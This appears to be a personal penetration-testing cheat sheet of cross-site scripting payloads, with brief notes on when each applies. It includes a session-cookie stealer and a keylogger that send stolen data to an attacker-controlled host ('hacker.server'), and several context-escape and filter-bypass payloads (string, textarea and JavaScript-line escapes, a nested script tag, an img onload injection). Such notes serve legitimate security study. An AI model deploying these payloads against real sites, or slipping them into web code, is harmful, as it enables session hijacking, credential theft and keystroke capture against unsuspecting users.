---
tags:
  - Penetration-Testing
  - Web-Hacking
  - XSS
---
## Proof of Concept - Alert Script
Causes an alert box to pop up with a text string
```javascript
<script>alert('XSS');</script>
```

## Session/Cookie Stealer
Captures target's cookie, encodes via base64 to ensure transmission, then posts it to web server under attacker control.
```javascript
<script>fetch('http://hacker.server/steal?cookie=' + btoa(document.cookie));</script>
```

## Key Logger
```javascript
<script>document.onkeypress = function(e) { fetch('http://hacker.server/log?key=' + btoa(e.key) );}</script>
```

## String Escape
**If application is treating user input as a string, need to add escape characters to close the string before executing XSS payload**

![[Pasted image 20240903122234.png]]
```javascript
"><script>alert('XSS');</script>
```

## Text Area Escape
**If application is putting user input into a designated text or other display area, need to escape area, then add XSS payload**

![[Pasted image 20240903122857.png]]
![[Pasted image 20240903122916.png]]

```javascript
</textarea><script>alert('XSS');</script>
```

## Javascript Code Line Escape
**If the application is processing user input as code, need to end current code structure, inject XSS payload, and comment out remaining code in line**
![[Pasted image 20240903123906.png]]

```javascript
';alert('XSS');//
```
- ' closes the field specifying the name
- ; signifies the end of the current command
- // at the end makes anything after a comment in the current line

![[Pasted image 20240903124401.png]]

## Bypassing Content Filtering
**If application is stripping "script" from payload (likely due to allow/deny listing), may be able to bypass using altered payload**
- Will likely require T&E
```javascript
<sscriptcript>alert('XSS');</sscriptcript>
```

![[Pasted image 20240903125440.png]]

## Onload
**If application is processing image uploads using the IMG tag, we can utilizing an additional attribute of the IMG tag: the onload event**
- Onload event executes code once the image specified in the src attribute has loaded.

```javascript
/images/cat.jpg" onload="alert('XSS');
```

![[Pasted image 20240903142603.png]]
